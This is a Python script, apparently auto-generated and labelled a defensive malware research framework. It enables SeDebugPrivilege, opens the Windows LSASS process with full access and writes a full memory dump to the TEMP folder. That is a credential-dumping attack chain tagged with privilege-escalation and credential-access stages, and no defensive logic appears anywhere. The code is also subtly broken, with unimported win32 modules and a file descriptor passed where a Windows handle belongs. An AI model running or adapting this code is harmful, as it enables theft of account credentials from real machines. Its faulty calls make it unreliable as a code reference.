#!/usr/bin/env python3
"""Merged Modules for Defensive Malware Research Framework"""

import sys
import json
import time
import os
from typing import Dict, Any
import ctypes
from ctypes import wintypes
import psutil

# Constants for Windows API
SE_DEBUG_NAME = "SeDebugPrivilege"
PROCESS_ALL_ACCESS = 0x1F0FFF
MINIDUMP_TYPE = 0x00000002  # MiniDumpWithFullMemory

# Load necessary Windows API functions
advapi32 = ctypes.WinDLL('Advapi32.dll')
kernel32 = ctypes.WinDLL('Kernel32.dll')
dbghelp = ctypes.WinDLL('Dbghelp.dll')

# Define necessary structures and functions
class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wintypes.DWORD), 
                ("Privileges", LUID_AND_ATTRIBUTES * 1)]

def enable_debug_privilege():
    """Enable SeDebugPrivilege for the current process."""
    hToken = wintypes.HANDLE()
    luid = LUID()
    tp = TOKEN_PRIVILEGES()
    
    # Open process token
    if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0020 | 0x0008, ctypes.byref(hToken)):
        return False

    # Lookup privilege value
    if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid)):
        return False

    # Set up privilege structure
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = 0x00000002  # SE_PRIVILEGE_ENABLED

    # Adjust token privileges
    if not advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None):
        return False

    return True

def dump_memory(pid: int, handle: int) -> Dict[str, Any]:
    """Dump the memory of a process to a file."""
    # Enable debug privilege
    if not enable_debug_privilege():
        return {'path': None, 'size': None}

    # Open the process
    process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not process_handle:
        return {'path': None, 'size': None}

    # Create dump file
    dump_file_path = os.path.join(os.environ['TEMP'], f"lsass_{pid}.dmp")
    with open(dump_file_path, 'wb') as dump_file:
        # Write the dump
        success = dbghelp.MiniDumpWriteDump(
            process_handle,
            pid,
            dump_file.fileno(),
            MINIDUMP_TYPE,
            None,
            None,
            None
        )

    # Close the process handle
    kernel32.CloseHandle(process_handle)

    if not success:
        return {'path': None, 'size': None}

    # Get the size of the dump file
    dump_file_size = os.path.getsize(dump_file_path)

    return {'path': dump_file_path, 'size': dump_file_size}

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    is_admin = False
    has_debug = False

    try:
        if win32security:
            # Check if the user is an admin
            is_admin = bool(win32security.IsUserAnAdmin())

            # Try to acquire SeDebugPrivilege
            hToken = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
            )
            privilege_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
            new_privileges = [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]
            win32security.AdjustTokenPrivileges(hToken, False, new_privileges)

            # Verify if the privilege was successfully acquired
            has_debug = win32security.GetTokenInformation(hToken, win32security.TokenPrivileges)
            has_debug = any(privilege_id == priv[0] and (priv[1] & win32security.SE_PRIVILEGE_ENABLED)
                            for priv in has_debug)
        else:
            # Fallback to checking if the user is an admin
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            has_debug = is_admin

        result = {'is_admin': is_admin, 'has_debug': has_debug}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Constants
        PROCESS_ALL_ACCESS = 0x1F0FFF
        SE_DEBUG_NAME = "SeDebugPrivilege"
        TOKEN_ADJUST_PRIVILEGES = 0x0020
        TOKEN_QUERY = 0x0008

        # Structures
        class LUID(ctypes.Structure):
            _fields_ = [("LowPart", wintypes.DWORD),
                        ("HighPart", wintypes.LONG)]

        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [("Luid", LUID),
                        ("Attributes", wintypes.DWORD)]

        class TOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [("PrivilegeCount", wintypes.DWORD),
                        ("Privileges", LUID_AND_ATTRIBUTES * 1)]

        # Functions
        OpenProcess = ctypes.windll.kernel32.OpenProcess
        OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        OpenProcess.restype = wintypes.HANDLE

        OpenProcessToken = ctypes.windll.advapi32.OpenProcessToken
        OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
        OpenProcessToken.restype = wintypes.BOOL

        LookupPrivilegeValue = ctypes.windll.advapi32.LookupPrivilegeValueW
        LookupPrivilegeValue.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(LUID)]
        LookupPrivilegeValue.restype = wintypes.BOOL

        AdjustTokenPrivileges = ctypes.windll.advapi32.AdjustTokenPrivileges
        AdjustTokenPrivileges.argtypes = [wintypes.HANDLE, wintypes.BOOL, ctypes.POINTER(TOKEN_PRIVILEGES), wintypes.DWORD, ctypes.POINTER(TOKEN_PRIVILEGES), ctypes.POINTER(wintypes.DWORD)]
        AdjustTokenPrivileges.restype = wintypes.BOOL

        # Adjust token privileges to enable SeDebugPrivilege
        if input_data.get('is_admin') and input_data.get('has_debug'):
            token_handle = wintypes.HANDLE()
            current_process = OpenProcess(PROCESS_ALL_ACCESS, False, ctypes.windll.kernel32.GetCurrentProcessId())
            if OpenProcessToken(current_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(token_handle)):
                luid = LUID()
                if LookupPrivilegeValue(None, SE_DEBUG_NAME, ctypes.byref(luid)):
                    tp = TOKEN_PRIVILEGES(1, LUID_AND_ATTRIBUTES(luid, 0x00000002))
                    AdjustTokenPrivileges(token_handle, False, ctypes.byref(tp), 0, None, None)

        # Find LSASS process
        lsass_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == 'lsass.exe':
                lsass_pid = proc.info['pid']
                break

        if lsass_pid is None:
            raise Exception("LSASS process not found")

        # Open handle to LSASS
        handle = OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)
        if not handle:
            raise Exception("Failed to open handle to LSASS")

        result = {
            "handle": handle,
            "pid": lsass_pid
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        pid = input_data.get('pid')
        handle = input_data.get('handle')
        result = dump_memory(pid, handle)
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Acquire Debug Privileges [privilege-escalation] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Acquire Debug Privileges): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Acquire Debug Privileges): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Access LSASS [credential-access] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Access LSASS): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Access LSASS): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Dump Memory [credential-access] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Dump Memory): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Dump Memory): FAILED — {err}')
            failed.append('T3')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))